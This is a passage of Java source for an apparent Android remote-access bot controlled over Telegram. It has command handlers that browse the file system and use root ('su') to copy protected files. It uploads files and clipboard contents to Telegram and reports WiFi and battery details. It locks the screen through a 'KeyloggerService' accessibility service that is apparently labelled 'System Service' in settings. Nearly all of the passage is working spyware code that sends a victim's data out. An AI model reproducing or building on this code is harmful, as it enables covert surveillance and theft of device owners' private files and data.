            return "OK".equals(l);
        } catch (Exception e) { return false; }
    }

    private boolean testRootFile(String path) {
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"su", "-c",
                    "test -f \"" + path.replace("\"", "\\\"") + "\" && echo OK"});
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String l = br.readLine();
            p.waitFor();
            return "OK".equals(l);
        } catch (Exception e) { return false; }
    }

    // ================= /files & /ls =================
    private void cmdFiles(String arg) {
        File dir = getCwd();

        if (arg != null && !arg.trim().isEmpty()) {
            File t = resolvePath(dir, arg.trim());
            if (t.isDirectory()) dir = t;
            else { sendMessage("❌ Not a directory: `" + arg + "`"); return; }
        }

        File[] files = dir.listFiles();
        boolean usingRoot = false;

        if (files == null) {
            if (hasRoot) {
                files = listWithRoot(dir.getAbsolutePath());
                usingRoot = (files != null);
            }
        }

        if (files == null) {
            sendMessage("❌ Cannot list (permission denied).\n" +
                    "Root: " + (hasRoot ? "✅" : "❌") + "\n" +
                    "Try: `adb shell appops set com.thunderx.telegramagent MANAGE_EXTERNAL_STORAGE allow`");
            return;
        }
        if (files.length == 0) { sendMessage("📁 Empty directory."); return; }

        // Sort: dirs first, then files
        Arrays.sort(files, (a, b) -> {
            if (a.isDirectory() && !b.isDirectory()) return -1;
            if (!a.isDirectory() && b.isDirectory()) return 1;
            return a.getName().compareToIgnoreCase(b.getName());
        });

        StringBuilder sb = new StringBuilder();
        sb.append("📁 *").append(dir.getAbsolutePath()).append("*");
        if (usingRoot) sb.append(" 🔓");
        sb.append("\n\n");

        for (File f : files) {
            if (sb.length() > 3500) { sb.append("_...truncated_"); break; }
            if (f.isDirectory()) {
                sb.append("📁 `").append(f.getName()).append("/`\n");
            } else {
                sb.append("📄 `").append(f.getName()).append("` _(")
                  .append(f.length() / 1024).append(" KB)_\n");
            }
        }
        sb.append("\n_").append(files.length).append(" items_");
        sendMessage(sb.toString());
    }

    // List a directory via `su ls`
    private File[] listWithRoot(String path) {
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"su", "-c",
                    "ls -la \"" + path.replace("\"", "\\\"") + "\""});
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
            List<File> out = new ArrayList<>();
            String line;
            while ((line = br.readLine()) != null) {
                if (line.startsWith("total")) continue;
                String[] parts = line.split("\\s+");
                if (parts.length < 9) continue;
                String name = parts[parts.length - 1];
                if (name.equals(".") || name.equals("..")) continue;
                out.add(new File(path, name));
            }
            p.waitFor();
            return out.isEmpty() ? null : out.toArray(new File[0]);
        } catch (Exception e) { return null; }
    }

    // ================= /get & /dl =================
    private void cmdGet(String arg) {
        if (arg == null || arg.trim().isEmpty()) {
            sendMessage("❌ Usage: `/get <filename>`");
            return;
        }
        File dir = getCwd();
        File target = resolvePath(dir, arg.trim());

        // Normal access?
        boolean normalAccess = target.exists() && target.canRead() && target.isFile();

        // Root fallback?
        if (!normalAccess && hasRoot && testRootFile(target.getAbsolutePath())) {
            File tmp = copyFromRoot(target);
            if (tmp == null) {
                sendMessage("❌ Root copy failed: `" + arg + "`");
                return;
            }
            sendFileByType(tmp, target.getName());
            // clean up temp after a bit
            new Handler(Looper.getMainLooper()).postDelayed(() -> tmp.delete(), 60000);
            return;
        }

        if (!normalAccess) {
            if (!target.exists()) {
                sendMessage("❌ Not found: `" + arg + "`\nRoot: " +
                        (hasRoot ? "✅" : "❌"));
            } else if (target.isDirectory()) {
                sendMessage("❌ That's a directory. Use `/cd " + target.getName() + "`");
            } else {
                sendMessage("❌ Permission denied: `" + arg + "`");
            }
            return;
        }

        long sizeMb = target.length() / (1024 * 1024);
        if (target.length() > MAX_UPLOAD_BYTES) {
            sendMessage("❌ Too large (" + sizeMb + " MB). Telegram bot limit: 50 MB.");
            return;
        }

        sendFileByType(target, target.getName());
    }

    // Copy file from root-protected location into app cache
    private File copyFromRoot(File src) {
        try {
            File dst = new File(getCacheDir(), src.getName());
            String cmd = "cat \"" + src.getAbsolutePath().replace("\"", "\\\"")
                       + "\" > \"" + dst.getAbsolutePath() + "\"";
            Process p = Runtime.getRuntime().exec(new String[]{"su", "-c", cmd});
            p.waitFor();
            return (dst.exists() && dst.length() > 0) ? dst : null;
        } catch (Exception e) { return null; }
    }

    // Auto-detect file type & send to Telegram
    private void sendFileByType(File f, String displayName) {
        if (f == null || !f.exists()) {
            sendMessage("❌ File not readable.");
            return;
        }
        String n = displayName.toLowerCase();

        if (n.endsWith(".jpg") || n.endsWith(".jpeg")
                || n.endsWith(".png") || n.endsWith(".webp")
                || n.endsWith(".bmp") || n.endsWith(".gif")) {
            sendFileToTelegram(f, "image/jpeg", displayName,
                    "sendPhoto", "photo", "🖼 " + displayName);
        } else if (n.endsWith(".mp4") || n.endsWith(".mkv")
                || n.endsWith(".avi") || n.endsWith(".mov")
                || n.endsWith(".3gp")) {
            sendFileToTelegram(f, "video/mp4", displayName,
                    "sendVideo", "video", "🎬 " + displayName);
        } else if (n.endsWith(".mp3") || n.endsWith(".m4a")
                || n.endsWith(".ogg") || n.endsWith(".flac")
                || n.endsWith(".wav")) {
            sendFileToTelegram(f, "audio/mpeg", displayName,
                    "sendAudio", "audio", "🎵 " + displayName);
        } else {
            sendFileToTelegram(f, "application/octet-stream", displayName,
                    "sendDocument", "document", "📄 " + displayName);
        }
    }

    // ================= /search =================
    private void cmdSearch(String arg) {
        if (arg == null || arg.trim().isEmpty()) {
            sendMessage("❌ Usage: `/search <name>`");
            return;
        }
        File dir = getCwd();
        String pat = arg.trim().toLowerCase();
        List<String> results = new ArrayList<>();
        searchRecursive(dir, pat, results, 0, 50);

        if (results.isEmpty()) {
            sendMessage("🔍 No matches in `" + dir.getAbsolutePath() + "`");
            return;
        }
        StringBuilder sb = new StringBuilder("🔍 *Found " + results.size() + ":*\n\n");
        for (String s : results) {
            if (sb.length() > 3500) { sb.append("_...truncated_"); break; }
            sb.append("`").append(s).append("`\n");
        }
        sendMessage(sb.toString());
    }

    private void searchRecursive(File dir, String pat, List<String> out, int depth, int max) {
        if (depth > 5 || out.size() >= max) return;
        File[] files = dir.listFiles();
        if (files == null) return;
        for (File f : files) {
            if (out.size() >= max) return;
            if (f.getName().toLowerCase().contains(pat)) {
                out.add(f.getAbsolutePath());
            }
            if (f.isDirectory() && !f.getName().startsWith(".")) {
                searchRecursive(f, pat, out, depth + 1, max);
            }
        }
    }

    // ================= /tree =================
    private void cmdTree(String arg) {
        File dir = getCwd();
        if (arg != null && !arg.trim().isEmpty()) {
            File t = resolvePath(dir, arg.trim());
            if (t.isDirectory()) dir = t;
        }
        StringBuilder sb = new StringBuilder("🌳 *" + dir.getAbsolutePath() + "*\n\n");
        buildTree(dir, "", sb, 0, 3);
        sendMessage(sb.toString());
    }

    private void buildTree(File dir, String prefix, StringBuilder sb, int depth, int maxDepth) {
        if (depth > maxDepth || sb.length() > 3500) return;
        File[] files = dir.listFiles();
        if (files == null) return;
        Arrays.sort(files, (a, b) -> {
            if (a.isDirectory() != b.isDirectory()) return a.isDirectory() ? -1 : 1;
            return a.getName().compareToIgnoreCase(b.getName());
        });
        for (int i = 0; i < files.length && sb.length() < 3500; i++) {
            File f = files[i];
            boolean last = (i == files.length - 1);
            sb.append(prefix).append(last ? "└── " : "├── ");
            sb.append(f.isDirectory() ? "📁 " : "📄 ").append(f.getName()).append("\n");
            if (f.isDirectory()) {
                buildTree(f, prefix + (last ? "    " : "│   "), sb, depth + 1, maxDepth);
            }
        }
    }

    // ================= /info =================
    private void cmdInfo(String arg) {
        if (arg == null || arg.trim().isEmpty()) {
            sendMessage("❌ Usage: `/info <file>`");
            return;
        }
        File dir = getCwd();
        File f = resolvePath(dir, arg.trim());
        if (!f.exists()) { sendMessage("❌ Not found: `" + arg + "`"); return; }

        String info = "📄 *" + f.getName() + "*\n" +
                "Path: `" + f.getAbsolutePath() + "`\n" +
                "Size: " + f.length() + " bytes (" + (f.length() / 1024) + " KB)\n" +
                "Directory: " + f.isDirectory() + "\n" +
                "Readable: " + f.canRead() + "\n" +
                "Writable: " + f.canWrite() + "\n" +
                "Modified: " + new Date(f.lastModified());
        sendMessage(info);
    }

    // ================= /clipboard =================
    private void getClipboard() {
        try {
            ClipboardManager cm = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
            if (cm == null || !cm.hasPrimaryClip()) {
                sendMessage("📋 Clipboard empty or unavailable.");
                return;
            }
            ClipData clip = cm.getPrimaryClip();
            if (clip == null || clip.getItemCount() == 0) {
                sendMessage("📋 Clipboard has no items.");
                return;
            }
            CharSequence text = clip.getItemAt(0).coerceToText(this);
            sendMessage("📋 *Clipboard:*\n" + (text != null ? text.toString() : "(empty)"));
        } catch (Exception e) {
            sendMessage("❌ Clipboard error: " + e.getMessage() +
                    "\n(Note: Android 10+ restricts clipboard access to foreground apps.)");
        }
    }

    // ================= /battery =================
    private void getBattery() {
        try {
            BatteryManager bm = (BatteryManager) getSystemService(BATTERY_SERVICE);
            int level = bm != null
                    ? bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
                    : -1;

            IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            Intent batteryStatus = registerReceiver(null, ifilter);

            String charging = "Unknown";
            int temp = 0, volt = 0;
            if (batteryStatus != null) {
                int status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
                boolean isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING
                        || status == BatteryManager.BATTERY_STATUS_FULL;
                charging = isCharging ? "Yes ⚡" : "No";
                temp = batteryStatus.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, 0);
                volt = batteryStatus.getIntExtra(BatteryManager.EXTRA_VOLTAGE, 0);
            }

            sendMessage("🔋 *Battery Info*\n" +
                    "Level: " + level + "%\n" +
                    "Charging: " + charging + "\n" +
                    "Temperature: " + (temp / 10.0) + "°C\n" +
                    "Voltage: " + volt + " mV");
        } catch (Exception e) {
            sendMessage("❌ Battery error: " + e.getMessage());
        }
    }

    // ================= /lock =================
    private void lockScreen() {
        boolean ok = KeyloggerService.lockScreen();
        if (ok) sendMessage("🔒 Screen locked.");
        else sendMessage("❌ Lock failed.\n\nEnable Accessibility Service:\n" +
                "Settings → Accessibility → System Service → ON");
    }

    // ================= /wifi =================
    private void getWifiInfo() {
        try {
            WifiManager wm = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
            if (wm == null) { sendMessage("❌ WifiManager unavailable."); return; }

            if (!wm.isWifiEnabled()) {
                sendMessage("📶 WiFi is disabled.");
                return;
            }

            WifiInfo info = wm.getConnectionInfo();
            if (info == null) { sendMessage("📶 Not connected to WiFi."); return; }

            String ssid = info.getSSID();
            String bssid = info.getBSSID();
            int rssi = info.getRssi();
            int speed = info.getLinkSpeed();
            int ip = info.getIpAddress();
            String ipStr = String.format(Locale.US, "%d.%d.%d.%d",
                    (ip & 0xff), (ip >> 8 & 0xff), (ip >> 16 & 0xff), (ip >> 24 & 0xff));

            sendMessage("📶 *WiFi Info*\n" +
                    "SSID: " + (ssid != null ? ssid : "?") + "\n" +
                    "BSSID: " + (bssid != null ? bssid : "?") + "\n" +
                    "IP: " + ipStr + "\n" +
                    "RSSI: " + rssi + " dBm\n" +
                    "Link Speed: " + speed + " Mbps\n\n" +
                    "_Note: On Android 10+, SSID requires Location permission._");
        } catch (Exception e) {
            sendMessage("❌ WiFi error: " + e.getMessage());
        }
    }
}
